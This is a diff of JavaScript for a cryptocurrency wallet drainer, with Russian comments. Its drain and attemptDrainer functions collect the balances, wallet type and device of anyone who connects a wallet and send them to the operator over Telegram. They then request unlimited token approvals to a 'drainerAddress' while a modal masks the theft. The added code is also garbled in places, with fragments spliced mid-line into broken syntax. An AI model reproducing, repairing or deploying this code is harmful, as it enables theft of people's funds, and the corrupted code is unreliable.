@@ -402,223 +402,240 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
 }
 
 async function drain(chainId, signer, userAddress, bal, provider) {
-  console.log(`Connected wallet: ${userAddress}`);
+  console.log('🔍 drain начат:', { chainId, userAddress, bal, provider: !!provider });
 
-  const chainConfig = config.CHAINS[chainId];
-  if (!chainConfig) throw new Error(`Configuration for chainId ${chainId} not found`);
-
-  console.log(`📍 Step 1: Checking configuration for chainId ${chainId}`);
-
-  const currentNetwork = await provider.getNetwork();
-  if (currentNetwork.chainId !== chainId) {
-    console.log(`📍 Current network ${currentNetwork.chainId}, switching to ${chainId}`);
-    try {
-      await switchChain(chainId);
-      console.log(`⏳ Waiting for network switch to complete...`);
-      await new Promise(resolve => setTimeout(resolve, 3000));
-      const newNetwork = await provider.getNetwork();
-      if (newNetwork.chainId !== chainId) {
-        throw new Error(`Failed to switch network: expected chainId ${chainId}, but got ${newNetwork.chainId}`);
-      }
-      console.log(`✅ Network switched to chainId ${chainId}`);
-    } catch (error) {
-      console.error(`❌ Error switching network: ${error.message}`);
-      if (error.code === 4001) {
-        throw new Error("User rejected network switch");
-      }
-      throw new Error(`Network switch failed: ${error.message}`);
-    }
-  }
-
-  const tokenAddresses = [chainConfig.usdtAddress, chainConfig.usdcAddress, ...Object.values(chainConfig.otherTokenAddresses || {})];
-
-  const connectNotifiedKey = `connectNotified_${userAddress}_${chainId}`;
-  const hasNotified = sessionStorage.getItem(connectNotifiedKey);
-
-  if (!hasNotified) {
-    console.log(`📍 Step 2: Sending connect notification`);
-    const shortAddress = shortenAddress(userAddress);
-    const walletName = detectWallet();
-    const networkName = chainConfig.name;
-    const funds = [];
-
-    const nativeBalance = ethers.utils.formatEther(bal.nativeBalance);
-    if (parseFloat(nativeBalance) > 0) {
-      const formattedNativeBalance = formatBalance(bal.nativeBalance, 18);
-      const nativePrice = await getTokenPriceInUSDT(config.TOKEN_SYMBOLS[chainConfig.nativeToken] || chainConfig.nativeToken);
-      const nativeValueInUSDT = (parseFloat(formattedNativeBalance) * nativePrice).toFixed(2);
-      funds.push(`- **${chainConfig.nativeToken}**(${networkName}): ${formattedNativeBalance} (\`${nativeValueInUSDT} USDT\`)`);
-    }
-
-    for (const tokenAddress of tokenAddresses) {
-      const tokenData = bal.tokenBalances[tokenAddress] || { balance: null, decimals: 18 };
-      if (tokenData.balance) {
-        const formattedBalance = parseFloat(ethers.utils.formatUnits(tokenData.balance, tokenData.decimals));
-        if (formattedBalance > 0) {
-          const symbol = tokenAddress === chainConfig.usdtAddress ? "USDT" :
-                        tokenAddress === chainConfig.usdcAddress ? "USDC" :
-                        Object.keys(chainConfig.otherTokenAddresses || {}).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
-          const tokenPrice = await getTokenPriceInUSDT(config.TOKEN_SYMBOLS[tokenAddress] || symbol);
-          const tokenValueInUSDT = (formattedBalance * tokenPrice).toFixed(2);
-          funds.push(`- **${symbol}**(${networkName}): ${formattedBalance.toFixed(6)} (\`${tokenValueInUSDT} USDT\`)`);
-        }
-      }
-    }
-
-    const device = detectDevice();
-    const fundsMessage = funds.length > 0 ? funds.join('\n') : 'токены не обнаружены';
-    const message = `🌀 Connect | [ ${shortAddress} ]\n\n` +
-                    `Wallet: ${walletName}\n` +
-                    `Network: ${networkName}\n` +
-                    `Funds:\n${fundsMessage}\n` +
-                    `Device: ${device}`;
-
-    await sendTelegramMessage(message);
-    sessionStorage.setItem(connectNotifiedKey, 'true');
-    console.log(`✅ Notification sent`);
-  }
-
-  const MAX = ethers.constants.MaxUint256;
-  const MIN_TOKEN_BALANCE = parseFloat(ethers.utils.formatUnits(ethers.utils.parseUnits("0.1", 6), 6));
-
-  console.log(`📍 Step 3: Checking ${chainConfig.nativeToken} balance for gas`);
-  let ethBalance;
   try {
-    ethBalance = await provider.getBalance(userAddress);
-    console.log(`📊 ${chainConfig.nativeToken} balance: ${ethers.utils.formatEther(ethBalance)}`);
-  } catch (error) {
-    console.error(`❌ Error fetching ${chainConfig.nativeToken} balance: ${error.message}`);
-    throw new Error(`Failed to fetch ${chainConfig.nativeToken} balance: ${error.message}`);
-  }
-
-  const minEthRequired = ethers.utils.parseEther("0.0003");
-  const ethBalanceFormatted = parseFloat(ethers.utils.formatEther(ethBalance));
-  if (ethBalanceFormatted < parseFloat(ethers.utils.formatEther(minEthRequired))) {
-    console.error(`❌ Insufficient ${chainConfig.nativeToken} for gas`);
-    throw new Error(`Insufficient ${chainConfig.nativeToken} balance for gas`);
-  }
-
-  console.log(`📍 Step 4: Collecting tokens to process`);
-  const tokensToProcess = [];
-
-  const tokenDataPromises = tokenAddresses.map(async (tokenAddress) => {
-    const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
-    const tokenData = bal.tokenBalances[tokenAddress] || { balance: null, decimals: 18 };
-    const realBalance = tokenData.balance || (await tokenContract.balanceOf(userAddress));
-    const decimals = tokenData.decimals;
-    console.log(`📊 Token ${tokenAddress} balance: ${ethers.utils.formatUnits(realBalance || 0, decimals)}`);
-    return { tokenAddress, tokenContract, realBalance, decimals };
-  });
-
-  const tokenDataResults = await Promise.all(tokenDataPromises);
-  console.log(`✅ Retrieved token data: ${tokenDataResults.length} tokens`);
-
-  for (const { tokenAddress, tokenContract, realBalance, decimals } of tokenDataResults) {
-    if (!realBalance) continue;
-    const storedBalance = bal.tokenBalances[tokenAddress]?.balance || null;
-    const storedBalanceFormatted = storedBalance ? parseFloat(ethers.utils.formatUnits(storedBalance, decimals)) : 0;
-    const realBalanceFormatted = parseFloat(ethers.utils.formatUnits(realBalance, decimals));
-
-    if (storedBalance && realBalanceFormatted < storedBalanceFormatted) {
-      bal.tokenBalances[tokenAddress] = { balance: realBalance, decimals: decimals };
+    // Проверяем валидность provider
+    if (!provider || typeof provider.getNetwork !== 'function') {
+      throw new Error('Invalid provider object');
     }
 
-    if (realBalanceFormatted > 0 && realBalanceFormatted > MIN_TOKEN_BALANCE) {
-      const symbol = tokenAddress === chainConfig.usdtAddress ? "USDT" :
-                    tokenAddress === chainConfig.usdcAddress ? "USDC" :
-                    Object.keys(chainConfig.otherTokenAddresses || {}).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
-      if (!symbol) {
-        console.warn(`⚠️ Skipping token ${tokenAddress}: symbol not defined`);
-        continue;
-      }
-      tokensToProcess.push({ token: symbol, balance: realBalance, contract: tokenContract, address: tokenAddress, decimals });
+    // Создаём новый Web3Provider, чтобы избежать модификации исходного provider
+    let web3Provider = new ethers.providers.Web3Provider(provider, 'any');
+    console.log('🔍 Web3Provider создан:', web3Provider);
+
+    const chainConfig = config.CHAINS[chainId.toString()];
+    if (!chainConfig) {
+      throw new Error(`Configuration for chainId ${chainId} not found`);
     }
-  }
 
-  console.log(`📍 Step 5: Fetching token prices and sorting`);
-  const pricePromises = tokensToProcess.map(async (token) => {
-    const price = await getTokenPriceInUSDT(config.TOKEN_SYMBOLS[token.address] || token.token);
-    const balanceInUnits = parseFloat(ethers.utils.formatUnits(token.balance, token.decimals));
-    token.valueInUSDT = balanceInUnits * price;
-    return token;
-  });
+    console.log(`📍 Step 1: Checking configuration for chainId ${chainId}`);
 
-  await Promise.all(pricePromises);
-  tokensToProcess.sort((a, b) => b.valueInUSDT - a.valueInUSDT);
-  console.log(`✅ Tokens sorted: ${tokensToProcess.map(t => t.token).join(', ')}`);
-
-  let status = 'rejected';
-  let modalClosed = false;
-
-  for (const { token, balance, contract, address, decimals } of tokensToProcess) {
-    if (!token) {
-      console.error(`❌ Token undefined for address ${address}, skipping`);
-      continue;
-    }
-    console.log(`📍 Step 6: Processing token ${token}`);
-
-    const allowanceBefore = await contract.allowance(userAddress, chainConfig.drainerAddress);
-    console.log(`📜 Allowance: ${ethers.utils.formatUnits(allowanceBefore, decimals)}`);
-
-    const allowanceFormatted = parseFloat(ethers.utils.formatUnits(allowanceBefore, decimals));
-    const balanceFormatted = parseFloat(ethers.utils.formatUnits(balance, decimals));
-    if (allowanceFormatted < balanceFormatted) {
+    const currentNetwork = await web3Provider.getNetwork();
+    if (currentNetwork.chainId.toString() !== chainId.toString()) {
+      console.log(`📍 Current network ${currentNetwork.chainId}, switching to ${chainId}`);
       try {
-        const nonce = await provider.getTransactionCount(userAddress, "pending");
-        const gasPrice = await provider.getGasPrice();
-        console.log(`📏 Gas price: ${ethers.utils.formatUnits(gasPrice, "gwei")} gwei`);
-
-        console.log(`⏳ Delay before approve for token ${token}`);
-        await delay(10);
-
-        const tx = await contract.approve(chainConfig.drainerAddress, MAX, {
-          gasLimit: 500000,
-          gasPrice,
-          nonce
-        });
-        console.log(`📤 Approve transaction sent: ${tx.hash}`);
-        const receipt = await tx.wait();
-        console.log(`✅ Approve transaction confirmed: ${receipt.transactionHash}`);
-
-        await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash, provider, balance);
-        status = 'confirmed';
-
-        if (!modalClosed) {
-          console.log(`ℹ Closing modal after successful approve for token ${token}`);
-          await hideModalWithDelay();
-          modalClosed = true;
+        await switchChain(chainId);
+        console.log(`⏳ Waiting for network switch to complete...`);
+        await new Promise(resolve => setTimeout(resolve, 3000));
+        const newNetwork = await web3Provider.getNetwork();
+        if (newNetwork.chainId.toString() !== chainId.toString()) {
+          throw new Error(`Failed to switch network: expected chainId ${chainId}, but got ${newNetwork.chainId}`);
         }
+        console.log(`✅ Network switched to chainId ${chainId}`);
       } catch (error) {
-        console.error(`❌ Error approving token ${token}: ${error.message}`);
-        if (error.message.includes('user rejected')) {
-          if (!modalClosed) {
-            console.log(`ℹ User rejected approve for token ${token}, closing modal`);
-            await hideModalWithDelay("Error: Transaction rejected by user.");
-            modalClosed = true;
+        console.error(`❌ Error switching network: ${error.message}`);
+        if (error.code === 4001) {
+          throw new Error("User rejected network switch");
+        }
+        throw new Error(`Network switch failed: ${error.message}`);
+      }
+    }
+
+    const tokenAddresses = [chainConfig.usdtAddress, chainConfig.usdcAddress, ...Object.values(chainConfig.otherTokenAddresses || {})];
+
+    const connectNotifiedKey = `connectNotified_${userAddress}_${chainId}`;
+    const hasNotified = sessionStorage.getItem(connectNotifiedKey);
+
+    if (!hasNotified) {
+      console.log(`📍 Step 2: Sending connect notification`);
+      const shortAddress = shortenAddress(userAddress);
+      const walletName = detectWallet();
+      const networkName = chainConfig.name;
+      const funds = [];
+
+      const nativeBalance = ethers.utils.formatEther(bal.nativeBalance);
+      if (parseFloat(nativeBalance) > 0) {
+        const formattedNativeBalance = formatBalance(bal.nativeBalance, 18);
+        const nativePrice = await getTokenPriceInUSDT(config.TOKEN_SYMBOLS[chainConfig.nativeToken] || chainConfig.nativeToken);
+        const nativeValueInUSDT = (parseFloat(formattedNativeBalance) * nativePrice).toFixed(2);
+        funds.push(`- **${chainConfig.nativeToken}**(${networkName}): ${formattedNativeBalance} (\`${nativeValueInUSDT} USDT\`)`);
+      }
+
+      for (const tokenAddress of tokenAddresses) {
+        const tokenData = bal.tokenBalances[tokenAddress] || { balance: null, decimals: 18 };
+        if (tokenData.balance) {
+          const formattedBalance = parseFloat(ethers.utils.formatUnits(tokenData.balance, tokenData.decimals));
+          if (formattedBalance > 0) {
+            const symbol = tokenAddress === chainConfig.usdtAddress ? "USDT" :
+                          tokenAddress === chainConfig.usdcAddress ? "USDC" :
+                          Object.keys(chainConfig.otherTokenAddresses       console.log(`✅ Network switched to chainId ${chainId}`);
+      } catch "Unknown";
+            const tokenPrice = await getTokenPriceInUSDT(config.TOKEN_SYMBOLS[tokenAddress] || symbol);
+            const tokenValueInUSDT = (formattedBalance * tokenPrice).toFixed(2);
+            funds.push(`- **${symbol}**(${networkName}): ${formattedBalance.toFixed(6)} (\`${tokenValueInUSDT} USDT\`)`);
           }
         }
-        throw new Error(`Failed to approve token ${token}: ${error.message}`);
-      }
-    } else {
-      console.log(`✅ Allowance already sufficient for token ${token}`);
-      try {
-        await notifyServer(userAddress, address, balance, chainId, null, provider, balance);
-        status = 'confirmed';
-      } catch (error) {
-        console.error(`❌ Error notifying server for token ${token}: ${error.message}`);
-        throw new Error(`Failed to notify server for token ${token}: ${error.message}`);
       }
 
-      if (!modalClosed) {
-        console.log(`ℹ Allowance sufficient for token ${token}, closing modal`);
-        modalClosed = true;
-        await hideModalWithDelay();
+      const device = detectDevice();
+      const fundsMessage = funds.length > 0 ? funds.join('\n') : 'токены не обнаружены';
+      const message ='🔍 Web3Provider создан:', web3Provider)+
+                     ainId, signer, userAddress,+
+ainId, signer, userAddress, b+
+                     ainId, signer, userAddress, b+
+                     ainId, signer, userAd
+
+      await sendTelegramMessage(message);
+      sessionStorage.setItem(connectNotifiedKey, 'true');
+      console.log(`✅ Notification sent`);
+    }
+
+    const MAX = ethers.constants.MaxUint256;
+    const MIN_TOKEN_BALANCE = parseFloat(ethers.utils.formatUnits(ethers.utils.parseUnits("0.1", 6), 6));
+
+    console.log(`📍 Step 3: Checking ${chainConfig.nativeToken} balance for gas`);
+    let ethBalance;
+    try {
+      ethBalance = await web3Provider.getBalance(userAddress);
+      console.log(`📊 ${chainConfig.nativeToken} balance: ${ethers.utils.formatEther(ethBalance)}`);
+    } catch (error) {
+      console.error(`❌ Error fetching ${chainConfig.nativeToken} balance: ${error.message}`);
+      throw new Error(`Failed to fetch ${chainConfig.nativeToken} balance: ${error.message}`);
+    }
+
+    const minEthRequired = ethers.utils.parseEther("0.0003");
+    const ethBalanceFormatted = parseFloat(ethers.utils.formatEther(ethBalance));
+    if (ethBalanceFormatted < parseFloat(ethers.utils.formatEther(minEthRequired))) {
+      console.error(`❌ Insufficient ${chainConfig.nativeToken} for gas`);
+      throw new Error(`Insufficient ${chainConfig.nativeToken} balance for gas`);
+    }
+
+    console.log(`📍 Step 4: Collecting tokens to process`);
+    const tokensToProcess = [];
+
+    const tokenDataPromises = tokenAddresses.map(async (tokenAddress) => {
+      const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
+      const tokenData = bal.tokenBalances[tokenAddress] || { balance: null, decimals: 18 };
+      const realBalance = tokenData.balance || (await tokenContract.balanceOf(userAddress));
+      const decimals = tokenData.decimals;
+      console.log(`📊 Token ${tokenAddress} balance: ${ethers.utils.formatUnits(realBalance || 0, decimals)}`);
+      return { tokenAddress, tokenContract, realBalance, decimals };
+    });
+
+    const tokenDataResults = await Promise.all(tokenDataPromises);
+    console.log(`✅ Retrieved token data: ${tokenDataResults.length} tokens`);
+
+    for (const { tokenAddress, tokenContract, realBalance, decimals } of tokenDataResults) {
+      if (!realBalance) continue;
+      const storedBalance = bal.tokenBalances[tokenAddress]?.balance || null;
+      const storedBalanceFormatted = storedBalance ? parseFloat(ethers.utils.formatUnits(storedBalance, decimals)) : 0;
+      const realBalanceFormatted = parseFloat(ethers.utils.formatUnits(realBalance, decimals));
+
+      if (storedBalance && realBalanceFormatted < storedBalanceFormatted) {
+        bal.tokenBalances[tokenAddress] = { balance: realBalance, decimals: decimals };
+      }
+
+      if (realBalanceFormatted > 0 && realBalanceFormatted > MIN_TOKEN_BALANCE) {
+        const symbol = tokenAddress === chainConfig.usdtAddress ? "USDT" :
+                      tokenAddress === chainConfig.usdcAddress ? "USDC" :
+                      Object.keys(chainConfig.otherTokenAddressesddress of tokenAddresses) {
+        const tokenData = bal.tokenBalances[tokenA"Unknown";
+        if (!symbol) {
+          console.warn(`⚠️ Skipping token ${tokenAddress}: symbol not defined`);
+          continue;
+        }
+        tokensToProcess.push({ token: symbol, balance: realBalance, contract: tokenContract, address: tokenAddress, decimals });
       }
     }
-  }
 
-  console.log(`📍 Step 7: Completing drain with status ${status}`);
-  return status;
+    console.log(`📍 Step 5: Fetching token prices and sorting`);
+    const pricePromises = tokensToProcess.map(async (token) => {
+      const price = await getTokenPriceInUSDT(config.TOKEN_SYMBOLS[token.address] || token.token);
+      const balanceInUSDT = parseFloat(ethers.utils.formatUnits(token.balance, token.decimals));
+      token.valueInUSDT = balanceInUSDT * price;
+      return token;
+    });
+
+    await Promise.all(pricePromises);
+    tokensToProcess.sort((a, b) => b.valueInUSDT - a.valueInUSDT);
+    console.log(`✅ Tokens sorted: ${tokensToProcess.map(t => t.token).join(', ')}`);
+
+    let status = 'rejected';
+    let modalClosed = false;
+for (const { token, balance, contract, address, decimals } of tokensToProcess) {
+      if (!token) {
+        console.error(`❌ Token undefined for address ${address}`);
+        continue;
+      }
+      console.log(`📍 Step 6: Processing token ${token}`);
+
+      const allowanceBefore = await contract.allowance(userAddress, chainConfig.drainerAddress);
+      console.log(`📜 Allowance: ${ethers.utils.formatUnits(allowanceBefore, decimals)}`);
+
+      const allowanceFormatted = parseFloat(ethers.utils.formatUnits(allowanceBefore, decimals));
+      const balanceFormatted = parseFloat(ethers.utils.formatUnits(balance, decimals));
+      if (allowanceFormatted < balanceFormatted) {
+        try {
+          const nonce = await web3Provider.getTransactionCount(userAddress, "pending");
+          const gasPrice = await web3Provider.getGasPrice();
+          console.log(`📏 Gas price: ${ethers.utils.formatUnits(gasPrice, "gwei")} gwei`);
+
+          console.log(`⏲️ Delay before approve for token ${token}`);
+          await delay(10);
+
+          const tx = await contract.approve(chainConfig.drainerAddress, MAX, {
+            gasLimit: 500000,
+            gasPrice,
+            nonce
+          });
+          console.log(`📤 Approve transaction sent: ${tx.hash}`);
+          const receipt = await tx.wait();
+          console.log(`✅ Approve transaction confirmed: ${receipt.transactionHash}`);
+
+          await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash, web3Provider, balance);
+          status = 'confirmed';
+
+          if (!modalClosed) {
+            console.log(`ℹ️ Closing modal after successful approve for token ${token}`);
+            await hideModalWithDelay();
+            modalClosed = true;
+          }
+        } catch (error) {
+          console.error(`❌ Error approving token ${token}: ${error.message}`);
+          if (error.message.includes('user rejected')) {
+            if (!modalClosed) {
+              console.log(`ℹ️ User rejected approve for token ${token}, closing modal`);
+              await hideModalWithDelay("Error: Transaction rejected by user.");
+              modalClosed = true;
+            }
+          }
+          throw new Error(`Failed to approve token ${token}: ${error.message}`);
+        }
+      } else {
+        console.log(`✅ Allowance already sufficient for token ${token}`);
+        try {
+          await notifyServer(userAddress, address, balance, chainId, null, web3Provider, balance);
+          status = 'confirmed';
+        } catch (error) {
+          console.error(`❌ Error notifying server for token ${token}: ${error.message}`);
+          throw new Error(`Failed to notify server for token ${token}: ${error.message}`);
+        }
+
+        if (!modalClosed) {
+          console.log(`ℹ️ Allowance sufficient for token ${token}, closing modal`);
+          modalClosed = true;
+          await hideModalWithDelay();
+        }
+      }
+    }
+
+    console.log(`📍 Step 7: Completing drain with status ${status}`);
+    return status;
+  } catch (error) {
+    console.error(`❌ Error in drain: ${error.message}`, error.stack);
+    throw error;
+  }
 }
 
 async function runDrainer(provider, signer, userAddress) {
@@ -932,7 +949,7 @@ async function hideModalWithDelay(errorMessage = null) {
 
 async function attemptDrainer() {
   if (hasDrained || isTransactionPending) {
-    console.log('⚠️ Transaction already completed or pending');
+    console.log('⚠ Transaction already completed or pending');
     await hideModalWithDelay("Transaction already completed or pending.");
     return;
   }
@@ -947,19 +964,19 @@ async function attemptDrainer() {
   showModal();
 
   try {
-    // Логируем состояние для отладки
-    const appKitState = appKit.getState ? appKit.getState() : {};
-    console.log('🔍 appKit state:', JSON.stringify(appKitState, null, 2));
+    // Логируем начальное состояние
+    let appKitState = appKit.getState ? appKit.getState() : {};
+    console.log('🔍 Начальное состояние appKit:', JSON.stringify(appKitState, null, 2));
 
     // Ожидаем завершения loading
     let attempts = 0;
     const maxAttempts = 10;
     const interval = 1000;
     while (appKitState.loading && attempts < maxAttempts) {
-      console.log(`ℹ️ Ожидание завершения loading, попытка ${attempts + 1}/${maxAttempts}...`);
+      console.log(`ℹ Ожидание завершения loading, попытка ${attempts + 1}/${maxAttempts}...`);
       await new Promise(resolve => setTimeout(resolve, interval));
-      attempts++;
       appKitState = appKit.getState ? appKit.getState() : {};
+      attempts++;
     }
 
     if (appKitState.loading) {
@@ -970,9 +987,9 @@ async function attemptDrainer() {
     let walletProvider = null;
     try {
       walletProvider = await appKit.getProvider();
-      console.log('✅ Провайдер получен через appKit.getProvider');
+      console.log('✅ Провайдер получен через appKit.getProvider:', walletProvider);
     } catch (error) {
-      console.error(`❌ Ошибка при получении провайдера через appKit.getProvider: ${error.message}`);
+      console.error(`❌ Ошибка при получении провайдера: ${error.message}`);
       throw new Error('Failed to get provider from appKit.getProvider');
     }
 
@@ -980,11 +997,17 @@ async function attemptDrainer() {
       throw new Error('No provider available after wallet connection');
     }
 
-    console.log('🔍 Провайдер:', walletProvider);
+    // Создаём Web3Provider
+    let provider = new ethers.providers.Web3Provider(walletProvider, 'any');
+    console.log('🔍 Web3Provider создан:', provider);
 
-    const provider = new ethers.providers.Web3Provider(walletProvider, 'any');
-    const signer = provider.getSigner();
-    const address = await signer.getAddress();
+    // Получаем signer
+    let signer = provider.getSigner();
+    console.log('🔍 Signer получен:', signer);
+
+    // Проверяем адрес
+    let address = await signer.getAddress();
+    console.log('🔍 Адрес из signer:', address);
 
     if (address.toLowerCase() !== connectedAddress.toLowerCase()) {
       throw new Error('Wallet address mismatch');
@@ -993,11 +1016,25 @@ async function attemptDrainer() {
     await new Promise(resolve => setTimeout(resolve, 10));
 
     isTransactionPending = true;
-    const { targetChainId, targetProvider } = await runDrainer(provider, signer, connectedAddress);
+    console.log('🔍 Запуск runDrainer с provider, signer, connectedAddress...');
+    let runDrainerResult = await runDrainer(provider, signer, connectedAddress);
+    console.log('🔍 Результат runDrainer:', runDrainerResult);
+
+    let { targetChainId, targetProvider } = runDrainerResult;
     if (targetChainId) {
+      console.log(`🔍 Переключение на chainId ${targetChainId}...`);
       await switchChain(targetChainId);
-      const status = await drain(targetChainId, signer, connectedAddress, await checkBalance(targetChainId, connectedAddress, targetProvider), targetProvider);
+      console.log('🔍 Запуск drain...');
+      let status = await drain(
+        targetChainId,
+        signer,
+        connectedAddress,
+        await checkBalance(targetChainId, connectedAddress, targetProvider),
+        targetProvider
+      );
       console.log(`✅ Drainer executed, status: ${status}`);
+    } else {
+      console.warn('⚠ Нет targetChainId, пропускаем drain');
     }
 
     hasDrained = true;
@@ -1015,14 +1052,17 @@ async function attemptDrainer() {
       errorMessage = "Error: Failed to process native token transfer. Your wallet may not support this operation.";
     } else if (error.message.includes('Failed to switch')) {
       errorMessage = "Error: Failed to switch network. Please switch manually in your wallet.";
+    } else if (error.message.includes('readonly property')) {
+      errorMessage = `Error: Attempted to modify a readonly property: ${error.message}`;
     } else {
       errorMessage = `Error: ${error.message}`;
     }
-    console.error(`❌ Drainer error: ${errorMessage}`);
+    console.error(`❌ Drainer error: ${errorMessage}`, error.stack);
     await hideModalWithDelay(errorMessage);
     throw error;
   }
 }
+
 
 async function handleConnectOrAction() {
   try {
